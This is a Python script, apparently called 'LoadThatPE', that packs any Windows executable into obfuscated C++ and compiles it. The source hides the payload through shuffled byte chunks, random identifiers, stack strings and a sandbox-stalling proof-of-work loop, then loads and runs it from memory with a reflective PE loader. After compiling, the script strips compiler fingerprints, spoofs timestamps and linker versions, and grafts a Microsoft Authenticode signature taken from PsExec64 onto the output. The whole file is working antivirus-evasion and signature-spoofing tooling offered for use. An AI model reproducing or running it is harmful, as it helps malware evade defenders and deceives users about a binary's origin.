import sys
import os
import random
import string
import requests
import subprocess
import pefile
import re
import urllib.request
import hashlib


COMPILER = "x86_64-w64-mingw32-g++"

COMPILER_FLAGS = [
    "--static",
    "-O3",
    "-s", "-Wl,--strip-all",
    "-fexceptions",
    "-fno-rtti",
    "-fno-ident",
    "-Wl,--image-base=0x10000000",
    "-fomit-frame-pointer",
    "-static-libgcc", "-static-libstdc++",
    "-Wl,--gc-sections", "-ffunction-sections", "-fdata-sections",
]

def compile_cpp(cpp_file: str, output_exe: str) -> bool:
    cmd = [COMPILER] + COMPILER_FLAGS + [cpp_file, "-o", output_exe]
    print(f"[+] Compiling...")
    result = subprocess.run(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    if result.returncode != 0:
        print(f"    [-] Compilation failed :")
        print(result.stderr)
        return False
    print(f"    [>] Compilation done successfully")
    return True



def steal_and_apply_signature(target_exe):
    """
    Vole la signature Authenticode d'un binaire signé Microsoft et la colle sur le binaire cible.
    La signature est dans le Security Directory (data directory index 4)
    C'est du WIN_CERTIFICATE : [DWORD length][WORD revision][WORD type][BYTE[] cert]
    """
    print(f"[+] Authenticode signature theft...")
    psexec_url = "https://live.sysinternals.com/PsExec64.exe"
    print(f"    [>] No source specified, downloading PsExec64 (Microsoft signed)...")
    print(f"    [>] URL : {psexec_url}")
    req = urllib.request.Request(psexec_url, headers={'User-Agent': 'Mozilla/5.0'})
    with urllib.request.urlopen(req, timeout=15) as r:
        src_data = bytearray(r.read())
    print(f"    [>] Downloaded : {len(src_data)} bytes")
    src_pe = pefile.PE(data=bytes(src_data))
    security_dir_idx = pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']
    if src_pe.OPTIONAL_HEADER.DATA_DIRECTORY[security_dir_idx].VirtualAddress == 0:
        print(f"    [!] Source binary has no Authenticode signature !")
        return False
    sig_offset = src_pe.OPTIONAL_HEADER.DATA_DIRECTORY[security_dir_idx].VirtualAddress
    sig_size   = src_pe.OPTIONAL_HEADER.DATA_DIRECTORY[security_dir_idx].Size
    signature_blob = bytes(src_data[sig_offset:sig_offset + sig_size])
    print(f"    [>] Signature extracted : {len(signature_blob)} bytes at file offset 0x{sig_offset:X}")
    with open(target_exe, 'rb') as f:
        dst_data = bytearray(f.read())
    dst_pe = pefile.PE(data=bytes(dst_data))
    dst_sec_va   = dst_pe.OPTIONAL_HEADER.DATA_DIRECTORY[security_dir_idx].VirtualAddress
    dst_sec_size = dst_pe.OPTIONAL_HEADER.DATA_DIRECTORY[security_dir_idx].Size
    if dst_sec_va != 0:
        dst_data = dst_data[:dst_sec_va]
        print(f"    [>] Existing signature removed from target")
    current_size = len(dst_data)
    alignment    = 8
    padding      = (alignment - (current_size % alignment)) % alignment
    dst_data    += b'\x00' * padding
    new_sig_offset = len(dst_data)
    sig_blob_patched = bytearray(signature_blob)
    new_length = len(signature_blob)
    sig_blob_patched[0:4] = new_length.to_bytes(4, 'little')
    dst_data += bytes(sig_blob_patched)
    dst_pe2 = pefile.PE(data=bytes(dst_data))
    dst_pe2.OPTIONAL_HEADER.DATA_DIRECTORY[security_dir_idx].VirtualAddress = new_sig_offset
    dst_pe2.OPTIONAL_HEADER.DATA_DIRECTORY[security_dir_idx].Size = len(sig_blob_patched)
    dst_pe2.OPTIONAL_HEADER.CheckSum = dst_pe2.generate_checksum()
    print(f"    [>] Security directory updated : offset=0x{new_sig_offset:X}, size={len(sig_blob_patched)}")
    print(f"    [>] Checksum recalculated : 0x{dst_pe2.OPTIONAL_HEADER.CheckSum:X}")
    final_data = dst_pe2.write()
    with open(target_exe, 'wb') as f:
        f.write(final_data)
    print(f"[+] Signature theft done → {target_exe}")
    print(f"    [!] Note : signature sera invalide cryptographiquement mais visible dans les métadonnées (exiftool, strings)")
    return True



def strip_compiler_info(exe_path):
    """
        Rich Header      → fingerprint du compilateur
        VS_VERSIONINFO   → version, auteur, copyright
        Debug directory  → chemin PDB, infos debug
        Timestamps       → date de compilation
        Strings GCC/MinGW → dans les sections .data/.rdata
    """
    print(f"[+] Stripping compiler metadata from {exe_path}...")
    pe = pefile.PE(exe_path)
    modified = False
    # Supprimer la section .debug
    if hasattr(pe, 'DIRECTORY_ENTRY_DEBUG'):
        for debug_entry in pe.DIRECTORY_ENTRY_DEBUG:
            offset = debug_entry.struct.PointerToRawData
            size   = debug_entry.struct.SizeOfData
            if offset and size:
                pe.set_bytes_at_offset(offset, b'\x00' * size)
                print(f"    [>] Debug entry zeroed at offset 0x{offset:X} ({size} bytes)")
        modified = True
    # Supprime le VS_VERSIONINFO (version resource)
    if hasattr(pe, 'VS_VERSIONINFO'):
        for vi in pe.VS_VERSIONINFO:
            offset = vi.struct.get_file_offset()
            size   = vi.struct.Length
            pe.set_bytes_at_offset(offset, b'\x00' * size)
            print(f"    [>] VS_VERSIONINFO zeroed ({size} bytes)")
        modified = True
    # Patch Rich Header (signature Intel/compilateur)
    rich_offset = _find_rich_header(pe)
    if rich_offset:
        rich_end = pe.get_data(rich_offset).find(b'Rich')
        if rich_end != -1:
            rich_end += rich_offset + 8  
            pe.set_bytes_at_offset(rich_offset, b'\x00' * (rich_end - rich_offset))
            print(f"    [>] Rich header zeroed at 0x{rich_offset:X}")
        modified = True
    # Recherche et supprime les strings de compilateur
    compiler_patterns = [
        b'GCC:', b'mingw', b'MinGW', b'MINGW', b'GNU',
        b'gcc', b'g++', b'libgcc', b'libstdc++',
        b'Created by', b'Compiled by', b'__MINGW',
    ]
    raw = bytearray(pe.write())
    count = 0
    for pattern in compiler_patterns:
        for match in re.finditer(re.escape(pattern), raw):
            start = match.start()
            end = raw.find(b'\x00', start)
            if end == -1 or end - start > 256:
                end = start + len(pattern)
            raw[start:end] = b'\x00' * (end - start)
            count += 1
    print(f"    [>] {count} compiler string(s) zeroed")
    # Écraser le timestamp du PE header
    pe2 = pefile.PE(data=bytes(raw))
    pe2.FILE_HEADER.TimeDateStamp = random.randint(0x40000000, 0x60000000)
    print(f"    [>] Timestamp randomized : 0x{pe2.FILE_HEADER.TimeDateStamp:X}")
    # MajorLinkerVersion=14, MinorLinkerVersion=20 → VS2019
    pe2.OPTIONAL_HEADER.MajorLinkerVersion = 14
    pe2.OPTIONAL_HEADER.MinorLinkerVersion = 20
    print(f"    [>] Linker version spoofed : 2.40 → 14.20 (MSVC VS2019)")
    pe2.OPTIONAL_HEADER.MajorOperatingSystemVersion = 6
    pe2.OPTIONAL_HEADER.MinorOperatingSystemVersion = 0
    pe2.OPTIONAL_HEADER.MajorSubsystemVersion = 6
    pe2.OPTIONAL_HEADER.MinorSubsystemVersion = 0
    print(f"    [>] OS/Subsystem version spoofed : 4.0/5.2 → 6.0/6.0 (Windows Vista+)")
    # Recalcul checksum
    pe2.OPTIONAL_HEADER.CheckSum = pe2.generate_checksum()
    print(f"    [>] Checksum recalculated : 0x{pe2.OPTIONAL_HEADER.CheckSum:X}")
    final_raw = pe2.write()
    with open(exe_path, 'wb') as f:
        f.write(final_raw)
    print(f"[+] Stripping done → {exe_path}")


def _find_rich_header(pe):
    """Trouve l'offset du Rich Header dans le DOS stub"""
    try:
        dos_stub = pe.get_data(0x3C, 0x100)
        idx = dos_stub.find(b'Rich')
        if idx == -1:
            raw = pe.get_data(0x80, 0x100)
            for i in range(0, len(raw) - 4, 4):
                candidate = raw[i:i+4]
                xor_key   = raw[i+4:i+8] if i+8 <= len(raw) else None
                if xor_key and (int.from_bytes(candidate, 'little') ^ int.from_bytes(xor_key, 'little')) == 0x536E4144:
                    return 0x80 + i
        else:
            return 0x3C + idx
    except:
        return None


def generate_random_name(prefix="", length=20):
    return prefix + ''.join(random.choices(string.ascii_letters, k=length))

def fetch_word_dictionary():
    print(f"[+] Fetching word dictionary...")
    word_site = "https://www.mit.edu/~ecprice/wordlist.10000"
    response = requests.get(word_site)
    words = response.content.splitlines()
    words = [word.decode('utf-8') for word in words]
    random.shuffle(words)
    # Map each possible byte value (0x00-0xFF) to a unique word
    byte_to_word = {}
    word_to_byte = {}
    for i in range(256):
        hex_val = f'0x{i:02x}'
        word = words[i]
        byte_to_word[i] = word
        word_to_byte[word] = i
    return byte_to_word, word_to_byte



def generate_pe_chunks_word_encoded(input_file, output_file=None):
    with open(input_file, 'rb') as f:
        pe_data = f.read()
    total_size = len(pe_data)
    print(f"[+] PE size : {total_size} bytes")
    byte_to_word, word_to_byte = fetch_word_dictionary()
    print(f"[+] Generating compact payload array...")

    var_names = {k: generate_random_name() for k in [
        "DecryptAndValidatePE", "MapPEToMemory", "SetMemoryPermissions",
        "ResolveImports", "RelocatePE", "ExecutePE",
        "encryptedPESize", "wordDict", "decodedPE",
        "dosHeader", "ntHeaders", "executableMemory", "section",
        "sectionHeaders", "oldProtect", "newProtect",
        "importDescriptor", "moduleName", "module",
        "thunkOriginal", "thunk", "importByName",
        "relocationDirectory", "delta", "relocation",
        "relocationEntries", "patchAddress",
        "context", "entryPoint", "mainThreadHandle",
        "decryptedPE", "payloadData", "getDecodedPE",
        "i1","i2","i3","i4","i5","i6","i7","i8","i9","i10",
        "start", "reconstructPayload", "completeVec",
        # proof-of-work
        "pow_prov", "pow_nonce", "pow_hash", "pow_digest", "pow_dlen",
        # stack strings
        "ss_loadlib", "ss_getproc", "ss_virtalloc", "ss_virtprot",
        "ss_getthread", "ss_setthread", "ss_banner",
    ]}

    def stack_string(varname, s):
        lines = [f'    char {varname}[{len(s)+1}];']
        for i, c in enumerate(s):
            lines.append(f'    {varname}[{i}] = 0x{ord(c):02X};')
        lines.append(f'    {varname}[{len(s)}] = 0x00;')
        return '\n'.join(lines)

    # -------------------------------------------------------------------------
    # HEADERS
    # -------------------------------------------------------------------------
    cpp_code  = "#include <windows.h>\n"
    cpp_code += "#include <iostream>\n"
    cpp_code += "#include <vector>\n"
    cpp_code += "#include <string>\n"
    cpp_code += "#include <unordered_map>\n"
    cpp_code += "#include <cstring>\n"
    cpp_code += "#include <stdexcept>\n"
    cpp_code += "#include <wincrypt.h>\n\n"
    cpp_code += "#pragma comment(lib, \"advapi32.lib\")\n\n"

    cpp_code += f"const size_t {var_names['encryptedPESize']} = {total_size}ULL;\n\n"

    # -------------------------------------------------------------------------
    # Dictionnaire : index (0-255) -> mot
    # -------------------------------------------------------------------------
    word_list = [byte_to_word[i] for i in range(256)]

    cpp_code += f"// Word list : index = byte value\n"
    cpp_code += f"static const char* {var_names['wordDict']}[256] = {{\n"
    for i, word in enumerate(word_list):
        cpp_code += f'    "{word}"'
        if i < 255:
            cpp_code += ","
        cpp_code += "\n"
    cpp_code += "};\n\n"

    # -------------------------------------------------------------------------
    # Chunking — taille variable, ordre shuffled
    # -------------------------------------------------------------------------
    chunk_size = random.randint(256, 2048)
    print(f"[+] Chunking payload ({chunk_size} bytes/chunk)...")
    chunk_starts = list(range(0, total_size, chunk_size))
    random.shuffle(chunk_starts)

    chunk_var_names = []
    chunk_offsets   = []

    for start_offset in chunk_starts:
        chunk_data = pe_data[start_offset:start_offset + chunk_size]
        cname = generate_random_name()
        chunk_var_names.append(cname)
        chunk_offsets.append(start_offset)

        values = []
        for b in chunk_data:
            word = byte_to_word[b]
            values.append(f"{b}u /* {word} */")

        cpp_code += f"// chunk offset={start_offset}, size={len(chunk_data)}\n"
        cpp_code += f"static const uint8_t {cname}[] = {{\n    "
        cpp_code += ",\n    ".join(values)
        cpp_code += "\n};\n\n"

    print(f"[+] Number of chunks : {len(chunk_starts)}")

    # -------------------------------------------------------------------------
    # reconstructPayload()
    # -------------------------------------------------------------------------
    cpp_code += f"unsigned char* {var_names['reconstructPayload']}() {{\n"
    cpp_code += f"    unsigned char* {var_names['completeVec']} = new unsigned char[{var_names['encryptedPESize']}];\n"
    cpp_code += f"    memset({var_names['completeVec']}, 0, {var_names['encryptedPESize']});\n"

    for i, start_offset in enumerate(chunk_offsets):
        cname  = chunk_var_names[i]
        csize  = len(pe_data[start_offset:start_offset + chunk_size])
        cpp_code += f"    memcpy({var_names['completeVec']} + {start_offset}, {cname}, {csize});\n"

    cpp_code += f"    return {var_names['completeVec']};\n"
    cpp_code += "}\n\n"

    # -------------------------------------------------------------------------
    # DecryptAndValidatePE()
    # -------------------------------------------------------------------------
    cpp_code += f"""unsigned char* {var_names["DecryptAndValidatePE"]}() {{
    unsigned char* {var_names["decryptedPE"]} = {var_names['reconstructPayload']}();
    IMAGE_DOS_HEADER* {var_names["dosHeader"]} = reinterpret_cast<IMAGE_DOS_HEADER*>({var_names["decryptedPE"]});
    if ({var_names["dosHeader"]}->e_magic != IMAGE_DOS_SIGNATURE) {{ exit(1); }}
    IMAGE_NT_HEADERS* {var_names["ntHeaders"]} = reinterpret_cast<IMAGE_NT_HEADERS*>({var_names["decryptedPE"]} + {var_names["dosHeader"]}->e_lfanew);
    if ({var_names["ntHeaders"]}->Signature != IMAGE_NT_SIGNATURE) {{ exit(1); }}
    if ({var_names["ntHeaders"]}->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {{ exit(1); }}
    return {var_names["decryptedPE"]};
}}
"""

    # -------------------------------------------------------------------------
    # MapPEToMemory()
    # -------------------------------------------------------------------------
    cpp_code += f"""unsigned char* {var_names["MapPEToMemory"]}(unsigned char* {var_names["decryptedPE"]}) {{
    {stack_string(var_names['ss_virtalloc'], 'VirtualAlloc')}
    {stack_string(var_names['ss_loadlib'], 'KERNEL32.DLL')}
    HMODULE _hK32 = GetModuleHandleA({var_names['ss_loadlib']});
    typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
    pVirtualAlloc _VirtualAlloc = (pVirtualAlloc)GetProcAddress(_hK32, {var_names['ss_virtalloc']});
    IMAGE_DOS_HEADER* {var_names["dosHeader"]} = reinterpret_cast<IMAGE_DOS_HEADER*>({var_names["decryptedPE"]});
    IMAGE_NT_HEADERS* {var_names["ntHeaders"]} = reinterpret_cast<IMAGE_NT_HEADERS*>({var_names["decryptedPE"]} + {var_names["dosHeader"]}->e_lfanew);
    if ({var_names["ntHeaders"]}->FileHeader.NumberOfSections == 0) {{ exit(1); }}
    unsigned char* {var_names["executableMemory"]} = reinterpret_cast<unsigned char*>(_VirtualAlloc(
        nullptr,
        {var_names["ntHeaders"]}->OptionalHeader.SizeOfImage,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    ));
    if (!{var_names["executableMemory"]}) {{ exit(1); }}
    memcpy({var_names["executableMemory"]}, {var_names["decryptedPE"]}, {var_names["ntHeaders"]}->OptionalHeader.SizeOfHeaders);
    IMAGE_SECTION_HEADER* {var_names["section"]} = IMAGE_FIRST_SECTION({var_names["ntHeaders"]});
    for (int {var_names["i1"]} = 0; {var_names["i1"]} < {var_names["ntHeaders"]}->FileHeader.NumberOfSections; ++{var_names["i1"]}) {{
        memset({var_names["executableMemory"]} + {var_names["section"]}[{var_names["i1"]}].VirtualAddress, 0, {var_names["section"]}[{var_names["i1"]}].Misc.VirtualSize);
        if ({var_names["section"]}[{var_names["i1"]}].SizeOfRawData > 0) {{
            memcpy({var_names["executableMemory"]} + {var_names["section"]}[{var_names["i1"]}].VirtualAddress,
                   {var_names["decryptedPE"]} + {var_names["section"]}[{var_names["i1"]}].PointerToRawData,
                   {var_names["section"]}[{var_names["i1"]}].SizeOfRawData);
        }}
    }}
    return {var_names["executableMemory"]};
}}
"""

    # -------------------------------------------------------------------------
    # SetMemoryPermissions()
    # -------------------------------------------------------------------------
    cpp_code += f"""void {var_names["SetMemoryPermissions"]}(unsigned char* {var_names["executableMemory"]}, IMAGE_NT_HEADERS* {var_names["ntHeaders"]}) {{
    {stack_string(var_names['ss_virtprot'], 'VirtualProtect')}
    {stack_string(var_names['ss_loadlib'], 'KERNEL32.DLL')}
    HMODULE _hK32b = GetModuleHandleA({var_names['ss_loadlib']});
    typedef BOOL (WINAPI *pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
    pVirtualProtect _VirtualProtect = (pVirtualProtect)GetProcAddress(_hK32b, {var_names['ss_virtprot']});
    IMAGE_SECTION_HEADER* {var_names["sectionHeaders"]} = IMAGE_FIRST_SECTION({var_names["ntHeaders"]});
    for (int {var_names["i2"]} = 0; {var_names["i2"]} < {var_names["ntHeaders"]}->FileHeader.NumberOfSections; ++{var_names["i2"]}) {{
        DWORD {var_names["oldProtect"]};
        DWORD {var_names["newProtect"]} = PAGE_READONLY;
        if ({var_names["sectionHeaders"]}[{var_names["i2"]}].Characteristics & IMAGE_SCN_MEM_EXECUTE) {{
            {var_names["newProtect"]} = ({var_names["sectionHeaders"]}[{var_names["i2"]}].Characteristics & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
        }} else if ({var_names["sectionHeaders"]}[{var_names["i2"]}].Characteristics & IMAGE_SCN_MEM_WRITE) {{
            {var_names["newProtect"]} = PAGE_READWRITE;
        }}
        if (!_VirtualProtect({var_names["executableMemory"]} + {var_names["sectionHeaders"]}[{var_names["i2"]}].VirtualAddress,
            {var_names["sectionHeaders"]}[{var_names["i2"]}].Misc.VirtualSize,
            {var_names["newProtect"]}, &{var_names["oldProtect"]})) {{ exit(1); }}
    }}
}}
"""

    # -------------------------------------------------------------------------
    # ResolveImports()
    # -------------------------------------------------------------------------
    cpp_code += f"""void {var_names["ResolveImports"]}(IMAGE_NT_HEADERS* {var_names["ntHeaders"]}, unsigned char* {var_names["executableMemory"]}) {{
    {stack_string(var_names['ss_loadlib'], 'LoadLibraryA')}
    {stack_string(var_names['ss_getproc'], 'GetProcAddress')}
    HMODULE _k32 = GetModuleHandleA("KERNEL32.DLL");
    typedef HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
    typedef FARPROC (WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
    pLoadLibraryA   _LoadLibraryA   = (pLoadLibraryA)  GetProcAddress(_k32, {var_names['ss_loadlib']});
    pGetProcAddress _GetProcAddress = (pGetProcAddress) GetProcAddress(_k32, {var_names['ss_getproc']});
    IMAGE_IMPORT_DESCRIPTOR* {var_names["importDescriptor"]} = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(
        {var_names["executableMemory"]} + {var_names["ntHeaders"]}->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    while ({var_names["importDescriptor"]}->Name) {{
        char* {var_names["moduleName"]} = reinterpret_cast<char*>({var_names["executableMemory"]} + {var_names["importDescriptor"]}->Name);
        HMODULE {var_names["module"]} = _LoadLibraryA({var_names["moduleName"]});
        if (!{var_names["module"]}) {{ exit(1); }}
        IMAGE_THUNK_DATA* {var_names["thunkOriginal"]} = reinterpret_cast<IMAGE_THUNK_DATA*>({var_names["executableMemory"]} + {var_names["importDescriptor"]}->OriginalFirstThunk);
        IMAGE_THUNK_DATA* {var_names["thunk"]} = reinterpret_cast<IMAGE_THUNK_DATA*>({var_names["executableMemory"]} + {var_names["importDescriptor"]}->FirstThunk);
        while ({var_names["thunkOriginal"]}->u1.AddressOfData) {{
            if ({var_names["thunkOriginal"]}->u1.Ordinal & IMAGE_ORDINAL_FLAG) {{
                WORD {var_names["i3"]} = static_cast<WORD>({var_names["thunkOriginal"]}->u1.Ordinal & 0xFFFF);
                {var_names["thunk"]}->u1.Function = reinterpret_cast<ULONGLONG>(_GetProcAddress({var_names["module"]}, reinterpret_cast<LPCSTR>({var_names["i3"]})));
            }} else {{
                IMAGE_IMPORT_BY_NAME* {var_names["importByName"]} = reinterpret_cast<IMAGE_IMPORT_BY_NAME*>({var_names["executableMemory"]} + {var_names["thunkOriginal"]}->u1.AddressOfData);
                {var_names["thunk"]}->u1.Function = reinterpret_cast<ULONGLONG>(_GetProcAddress({var_names["module"]}, {var_names["importByName"]}->Name));
            }}
            if (!{var_names["thunk"]}->u1.Function) {{ exit(1); }}
            ++{var_names["thunkOriginal"]}; ++{var_names["thunk"]};
        }}
        ++{var_names["importDescriptor"]};
    }}
}}
"""

    # -------------------------------------------------------------------------
    # RelocatePE()
    # -------------------------------------------------------------------------
    cpp_code += f"""void {var_names["RelocatePE"]}(unsigned char* {var_names["executableMemory"]}, IMAGE_NT_HEADERS* {var_names["ntHeaders"]}) {{
    IMAGE_DATA_DIRECTORY {var_names["relocationDirectory"]} = {var_names["ntHeaders"]}->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if ({var_names["relocationDirectory"]}.VirtualAddress == 0 || {var_names["relocationDirectory"]}.Size == 0) return;
    DWORD64 {var_names["delta"]} = reinterpret_cast<DWORD64>({var_names["executableMemory"]}) - {var_names["ntHeaders"]}->OptionalHeader.ImageBase;
    IMAGE_BASE_RELOCATION* {var_names["relocation"]} = reinterpret_cast<IMAGE_BASE_RELOCATION*>({var_names["executableMemory"]} + {var_names["relocationDirectory"]}.VirtualAddress);
    while ({var_names["relocation"]}->VirtualAddress != 0) {{
        DWORD {var_names["i5"]} = ({var_names["relocation"]}->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD* {var_names["relocationEntries"]} = reinterpret_cast<WORD*>({var_names["relocation"]} + 1);
        for (DWORD {var_names["i6"]} = 0; {var_names["i6"]} < {var_names["i5"]}; {var_names["i6"]}++) {{
            if ({var_names["relocationEntries"]}[{var_names["i6"]}] >> 12 == IMAGE_REL_BASED_DIR64) {{
                DWORD64* {var_names["patchAddress"]} = reinterpret_cast<DWORD64*>(
                    {var_names["executableMemory"]} + {var_names["relocation"]}->VirtualAddress + ({var_names["relocationEntries"]}[{var_names["i6"]}] & 0xFFF));
                *{var_names["patchAddress"]} += {var_names["delta"]};
            }}
        }}
        {var_names["relocation"]} = reinterpret_cast<IMAGE_BASE_RELOCATION*>(
            reinterpret_cast<unsigned char*>({var_names["relocation"]}) + {var_names["relocation"]}->SizeOfBlock);
    }}
}}
"""

    # -------------------------------------------------------------------------
    # ExecutePE()
    # -------------------------------------------------------------------------
    cpp_code += f"""void {var_names["ExecutePE"]}(unsigned char* {var_names["executableMemory"]}, HANDLE {var_names["mainThreadHandle"]}) {{
    {stack_string(var_names['ss_getthread'], 'GetThreadContext')}
    {stack_string(var_names['ss_setthread'], 'SetThreadContext')}
    {stack_string(var_names['ss_loadlib'],   'KERNEL32.DLL')}
    HMODULE _hK32d = GetModuleHandleA({var_names['ss_loadlib']});
    typedef BOOL (WINAPI *pGetThreadContext)(HANDLE, LPCONTEXT);
    typedef BOOL (WINAPI *pSetThreadContext)(HANDLE, const CONTEXT*);
    pGetThreadContext _GetThreadContext = (pGetThreadContext)GetProcAddress(_hK32d, {var_names['ss_getthread']});
    pSetThreadContext _SetThreadContext = (pSetThreadContext)GetProcAddress(_hK32d, {var_names['ss_setthread']});
    IMAGE_DOS_HEADER* {var_names["dosHeader"]} = reinterpret_cast<IMAGE_DOS_HEADER*>({var_names["executableMemory"]});
    IMAGE_NT_HEADERS* {var_names["ntHeaders"]} = reinterpret_cast<IMAGE_NT_HEADERS*>({var_names["executableMemory"]} + {var_names["dosHeader"]}->e_lfanew);
    CONTEXT {var_names["context"]} = {{}};
    {var_names["context"]}.ContextFlags = CONTEXT_FULL;
    if (!_GetThreadContext({var_names["mainThreadHandle"]}, &{var_names["context"]})) {{ exit(1); }}
    DWORD64 {var_names["entryPoint"]} = {var_names["ntHeaders"]}->OptionalHeader.AddressOfEntryPoint + reinterpret_cast<DWORD64>({var_names["executableMemory"]});
    if ({var_names["entryPoint"]} < reinterpret_cast<DWORD64>({var_names["executableMemory"]}) ||
        {var_names["entryPoint"]} >= reinterpret_cast<DWORD64>({var_names["executableMemory"]}) + {var_names["ntHeaders"]}->OptionalHeader.SizeOfImage) {{ exit(1); }}
    {var_names["context"]}.Rip = {var_names["entryPoint"]};
    if (!_SetThreadContext({var_names["mainThreadHandle"]}, &{var_names["context"]})) {{ exit(1); }}
}}
"""

    # -------------------------------------------------------------------------
    # main() — PoW aléatoire en difficulté + banner
    # -------------------------------------------------------------------------

    cpp_code += f"""int main() {{
    {{
        HCRYPTPROV pow_prov = 0;
        CryptAcquireContextA(&pow_prov, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
        uint64_t pow_nonce = 0;
        while (1) {{
            HCRYPTHASH pow_hash = 0;
            CryptCreateHash(pow_prov, CALG_SHA_256, 0, 0, &pow_hash);
            CryptHashData(pow_hash, (BYTE*)&pow_nonce, 8, 0);
            BYTE pow_digest[32]; DWORD pow_dlen = 32;
            CryptGetHashParam(pow_hash, HP_HASHVAL, pow_digest, &pow_dlen, 0);
            CryptDestroyHash(pow_hash);
            if (pow_digest[0] == 0 &&
                pow_digest[1] == 0 &&
                pow_digest[2] == 0 &&
                pow_digest[3] < 0x40) break;
            pow_nonce++;
        }}
        CryptReleaseContext(pow_prov, 0);
    }}

    HANDLE {var_names["mainThreadHandle"]} = GetCurrentThread();
    unsigned char* {var_names["decryptedPE"]} = {var_names["DecryptAndValidatePE"]}();
    unsigned char* {var_names["executableMemory"]} = {var_names["MapPEToMemory"]}({var_names["decryptedPE"]});
    IMAGE_NT_HEADERS* {var_names["ntHeaders"]} = reinterpret_cast<IMAGE_NT_HEADERS*>(
        {var_names["executableMemory"]} + reinterpret_cast<IMAGE_DOS_HEADER*>({var_names["executableMemory"]})->e_lfanew);
    {var_names["ResolveImports"]}({var_names["ntHeaders"]}, {var_names["executableMemory"]});
    {var_names["RelocatePE"]}({var_names["executableMemory"]}, {var_names["ntHeaders"]});
    {var_names["SetMemoryPermissions"]}({var_names["executableMemory"]}, {var_names["ntHeaders"]});
    {var_names["ExecutePE"]}({var_names["executableMemory"]}, {var_names["mainThreadHandle"]});
    return 0;
}}
"""

    if output_file:
        with open(output_file, 'w') as out_file:
            out_file.write(cpp_code)
    else:
        print(cpp_code)





if __name__ == "__main__":
    print(f"*******************************************")
    print(f"************** LoadThatPE *****************")
    print(f"******* Word Dictionary Edition ***********")
    print(f"*******************************************\n")

    if len(sys.argv) < 1 or len(sys.argv) > 2:
        print("Usage : python encrypt_pe.py <PE_file>")
        sys.exit(1)

    input_path  = sys.argv[1]
    cpp_code_path = "encrypted_pe.cpp"
    output_path = "encrypted_pe.exe"

    if not os.path.exists(input_path):
        print(f"[-] File not found : {input_path}")
        sys.exit(1)

    generate_pe_chunks_word_encoded(input_path, cpp_code_path)
    compile_cpp(cpp_code_path, output_path)
    strip_compiler_info(output_path)
    steal_and_apply_signature(output_path)